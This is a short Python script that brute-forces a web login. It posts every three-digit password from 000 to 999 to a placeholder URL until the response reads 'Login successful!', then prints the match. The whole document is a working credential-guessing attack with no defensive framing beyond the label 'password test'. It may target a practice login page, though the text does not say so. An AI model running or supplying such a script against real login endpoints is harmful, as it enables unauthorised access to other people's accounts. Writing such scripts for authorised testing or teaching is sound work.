import requests

URL = "YOUR_URL_HERE"

print("Starting password test...")

for number in range(1000):
    password = f"{number:03d}"

    response = requests.post(
        URL,
        data={"password": password}
    )

    if "Login successful!" in response.text:
        print("Password found:", password)
        break

print("Testing completed.") 